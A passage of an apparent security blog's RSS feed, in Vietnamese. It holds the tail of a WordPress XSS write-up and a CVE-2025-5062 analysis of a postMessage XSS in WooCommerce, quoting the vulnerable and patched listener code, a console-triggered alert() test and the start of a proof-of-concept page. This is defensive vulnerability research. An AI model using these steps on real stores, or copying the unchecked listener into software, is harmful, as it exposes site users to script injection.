1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-58674 cho thấy rủi ro khi chèn dữ liệu người dùng trực tiếp vào HTML bằng &lt;code&gt;html()&lt;/code&gt; hoặc &lt;code&gt;innerHTML&lt;/code&gt;. &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; trong &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; được parser tách ra và thực thi, trong khi các thẻ khác bị bỏ hoặc coi là text. Bản vá sử dụng thuộc tính &lt;code&gt;text&lt;/code&gt; để đảm bảo an toàn, loại bỏ XSS.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không nối chuỗi HTML từ dữ liệu user rồi chèn bằng &lt;code&gt;html()&lt;/code&gt;/&lt;code&gt;innerHTML&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dùng API tạo element an toàn (&lt;code&gt;option.text&lt;/code&gt;, &lt;code&gt;document.createElement&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Luôn escape/sanitize dữ liệu ở cả server và client.&lt;/li&gt;&#xA;&lt;li&gt;Hiểu hành vi parser: &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; có thể thoát khỏi container inert.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet — PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Core &amp;lt;= 6.8.2 is vulnerable to Cross Site Scripting (XSS) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-5062 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-10-cve-2025-5062/</link>
      <pubDate>Fri, 10 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-10-cve-2025-5062/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WooCommerce cho WordPress có lỗ hổng &lt;strong&gt;Cross-Site Scripting (XSS) dựa trên PostMessage&lt;/strong&gt; thông qua trang &lt;strong&gt;&amp;lsquo;customize-store&amp;rsquo;&lt;/strong&gt; ở tất cả các phiên bản đến và bao gồm &lt;strong&gt;9.4.2&lt;/strong&gt;, do việc &lt;strong&gt;xử lý dữ liệu PostMessage chưa đủ an toàn&lt;/strong&gt; (không lọc đầu vào và không escape dữ liệu khi xuất ra). Điều này cho phép &lt;strong&gt;kẻ tấn công không cần xác thực&lt;/strong&gt; chèn các đoạn script tùy ý vào trang web, mà sẽ thực thi nếu họ lừa được người dùng thực hiện một hành động, ví dụ như &lt;strong&gt;click vào một liên kết&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-5062&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-5062&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 9.3.2 and from 9.4 through 9.4.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 9.3.4 and 9.4.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WooCommerce Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WooCommerce&lt;/strong&gt;: &lt;strong&gt;9.4.2&lt;/strong&gt; (vulnerable) và &lt;strong&gt;9.4.3&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong phiên bản &lt;strong&gt;vulnerable&lt;/strong&gt;, &lt;code&gt;attachParentListeners()&lt;/code&gt; lắng nghe tất cả các message từ bất kỳ nguồn nào mà không kiểm tra origin, dữ liệu từ message được gán trực tiếp vào DOM dẫn đến nguy cơ &lt;strong&gt;PostMessage-Based XSS&lt;/strong&gt; (sub-type của &lt;strong&gt;DOM-based XSS&lt;/strong&gt;).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;export function attachParentListeners() {&#xA;&#x9;const listener = ( event ) =&amp;gt; {&#xA;    if ( event.data.type === &amp;#39;navigate&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;window.location.href = event.data.url;&#xA;    }&#xA;&#x9;};&#xA;  window.addEventListener( &amp;#39;message&amp;#39;, listener, false );&#xA;  return () =&amp;gt; {&#xA;    window.removeEventListener( &amp;#39;message&amp;#39;, listener, false );&#xA;  };&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;client/admin/client/customize-store/utils.js v9.4.2&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;Trong phiên bản &lt;strong&gt;patched&lt;/strong&gt;, mã đã bổ sung nhiều lớp kiểm tra và hạn chế so với phiên bản vulnerable, chuyển từ &lt;code&gt;“chấp nhận mọi message và redirect thẳng”&lt;/code&gt; sang &lt;code&gt;“chỉ chấp nhận message đáng tin, xác thực cấu trúc và kiểm tra URL trước khi điều hướng”&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;export function attachParentListeners() {&#xA;  const allowedOrigins = [ getAdminSetting( &amp;#39;homeUrl&amp;#39; ) ];&#xA;&#xA;&#x9;function handleMessage( event ) {&#xA;&#x9;&#x9;// Validate the origin.&#xA;&#x9;&#x9;if ( ! allowedOrigins.includes( event.origin ) ) {&#xA;&#x9;&#x9;&#x9;// Blocked message from untrusted origin: event.origin.&#xA;&#x9;&#x9;&#x9;return;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;// Validate the structure of event.data.&#xA;&#x9;&#x9;if (&#xA;&#x9;&#x9;&#x9;! event.data ||&#xA;&#x9;&#x9;&#x9;typeof event.data.type !== &amp;#39;string&amp;#39; ||&#xA;&#x9;&#x9;&#x9;typeof event.data.url !== &amp;#39;string&amp;#39;&#xA;&#x9;&#x9;) {&#xA;&#x9;&#x9;&#x9;// Invalid message structure: event.data.&#xA;&#x9;&#x9;&#x9;return;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;// Only allow the &amp;#39;navigate&amp;#39; type.&#xA;&#x9;&#x9;if ( event.data.type === &amp;#39;navigate&amp;#39; ) {&#xA;      // Validate the URL format.&#xA;&#x9;&#x9;&#x9;try {&#xA;&#x9;&#x9;&#x9;&#x9;const url = parseAdminUrl( event.data.url );&#xA;&#x9;&#x9;&#x9;&#x9;// Further restrict navigation to trusted domains.&#xA;&#x9;&#x9;&#x9;&#x9;if (&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;! allowedOrigins.some( ( origin ) =&amp;gt; url.origin === origin )&#xA;&#x9;&#x9;&#x9;&#x9;) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;throw new Error(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;`Blocked navigation to untrusted URL: ${ url.href }`&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;&#x9;window.location.href = url.href;&#xA;&#x9;&#x9;&#x9;} catch ( error ) {&#xA;&#x9;&#x9;&#x9;&#x9;// Invalid URL: event.data.url.&#xA;&#x9;&#x9;&#x9;&#x9;captureException( error );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;    }&#xA;    window.addEventListener( &amp;#39;message&amp;#39;, handleMessage, false );&#xA;    &#x9;return function removeListener() {&#xA;&#x9;&#x9;window.removeEventListener( &amp;#39;message&amp;#39;, handleMessage, false );&#xA;&#x9;};&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;client/admin/client/customize-store/utils.js v9.4.3&amp;rdquo;}&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/dif1.png&#34;&#xA;    alt=&#34;Diff — So sánh thay đổi mã nguồn giữa phiên bản vulnerable và bản patched&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff — So sánh thay đổi mã nguồn giữa phiên bản vulnerable và bản patched&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tuy đã tìm ra source và sink, nhưng khi phân tích mã nguồn của plugin sau khi upload tôi lại không tìm được hàm &lt;code&gt;attachParentListeners()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/search1.png&#34;&#xA;    alt=&#34;Kết quả tìm kiếm attachParentListeners()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả tìm kiếm attachParentListeners()&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Tôi nghĩ mình đã setup sai nên code không được tải về đầy đủ. Nhưng không, khi tìm với từ khóa &lt;code&gt;&amp;quot;navigate&amp;quot;&lt;/code&gt; tôi nhận được hàm khác tên có chức năng tương tự &lt;code&gt;attachParentListeners()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/search2.png&#34;&#xA;    alt=&#34;Kết quả tìm kiếm &amp;rsquo;navigate&amp;#39;&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả tìm kiếm &amp;rsquo;navigate&#39;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Trong bản product, để tối ưu hóa thời gian tải dữ liệu về trình duyệt, plugin đã dùng kỹ thuật &lt;a href=&#34;https://digitalm.sg/seo-terms/minification/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;minification&lt;/a&gt; loại bỏ khoảng trắng, đặt tên hàm, biến ngắn và một phần obfuscation làm cho mã khó đọc hơn.&lt;/p&gt;&#xA;&lt;p&gt;File được tải về có tên &lt;code&gt;5292.js&lt;/code&gt; chứ không phải &lt;code&gt;utils.js&lt;/code&gt;. Sau khi làm đẹp code, tôi thấy &lt;code&gt;5292.js&lt;/code&gt; chứa mã của &lt;code&gt;utils.js&lt;/code&gt; và nhiều mã từ các file khác.&lt;/p&gt;&#xA;&lt;p&gt;Truy cập trang &lt;code&gt;customize-store&lt;/code&gt; và thử gửi &lt;strong&gt;postMessage&lt;/strong&gt; bằng console của trình duyệt&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=wc-admin&amp;amp;path=%2Fcustomize-store&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/xss1.png&#34;&#xA;    alt=&#34;Sự kiện alert() khi postMessage từ console browser&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Sự kiện alert() khi postMessage từ console browser&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 &lt;code&gt;alert()&lt;/code&gt; được kích hoạt, sử dụng debug trong trình duyệt để xem &lt;code&gt;5292.js&lt;/code&gt; được tải trong trình duyệt&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/debug1.png&#34;&#xA;    alt=&#34;5292.js từ debug của browser&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;5292.js từ debug của browser&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: &lt;code&gt;event.data&lt;/code&gt; từ &lt;code&gt;window.postMessage&lt;/code&gt; (cụ thể &lt;code&gt;event.data.url&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;window.location.href = event.data.url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tạo trang web với mã nguồn sau:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;button 